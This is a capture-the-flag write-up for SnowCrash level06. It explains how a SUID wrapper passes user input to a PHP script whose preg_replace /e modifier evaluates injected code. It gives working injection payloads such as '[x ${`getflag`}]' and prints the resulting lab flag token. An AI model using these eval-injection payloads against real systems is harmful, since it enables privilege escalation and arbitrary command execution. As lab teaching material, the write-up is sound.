# Level06

## 1. Identity

```bash
$ id
uid=2006(level06) gid=2006(level06) groups=2006(level06),100(users)
```

We are logged in as **level06**.

## 2. Home directory

```bash
$ pwd
/home/user/level06

$ ls -la
...
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
...
```

We have two interesting files:
- a SUID binary: level06
- a PHP script: level06.php

Both require arguments:

```bash
$ ./level06
PHP Warning: file_get_contents(): Filename cannot be empty ...

$ php level06.php
PHP Notice: Undefined offset: 1 ...
PHP Notice: Undefined offset: 2 ...

```

So we need to provide them with input.

## 3. Why both a binary and a PHP script?

The SUID bit only works on **ELF binaries**, **never** on interpreted scripts (PHP, Python, Bash…).
So level06.php **cannot** be SUID by itself.

This is why level06 exists:
- It is a small wrapper binary running as **flag06** that simply calls the PHP script with the user arguments.

This gives the vulnerable PHP code **flag06 privileges**, allowing us to read the flag.

## 4. Vulnerable script

Full commented source :

```php
#!/usr/bin/php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);   // replace '.' with ' x '
    $m = preg_replace("/@/", " y", $m);     // replace '@' with ' y'
    return $m;
}

function x($y, $z) {
    $a = file_get_contents($y);            // read user-provided file

    $a = preg_replace(
        "/(\[x (.*)\])/e",                 // pattern with /e = evaluate replacement
        "y(\"\\2\")",                      // executes PHP code inside y("...")
        $a                                 // user-controlled content
    );

    // Cosmetic bracket replacement
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);

    return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>

```

The key issue is here :

```php
preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

The `/e` modifier means :
- **Evaluate the replacement as PHP code.**
- **So the content captured by (.*) inside [x ... ] is executed as PHP.**

## 5. Exploitation

Create a malicious file :

```bash
$ echo '[x ${`getflag`}]' > /tmp/payload
```

Run it through the SUID binary:

```bash
level06@SnowCrash:~$ ./level06 /tmp/payload
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

Works because:
- `${...}` is PHP “variable parsing” syntax
- Backticks \`cmd\` execute a system command in PHP
- The `/e` modifier evaluates this as PHP code under **flag06 privileges**

Many payload formats work :

```bash
[x ${`getflag`}]
[x {${exec(getflag)}}]
[x system(getflag)]
```

All are executed because the regex expands them into actual PHP code evaluated by preg_replace.

End of simulation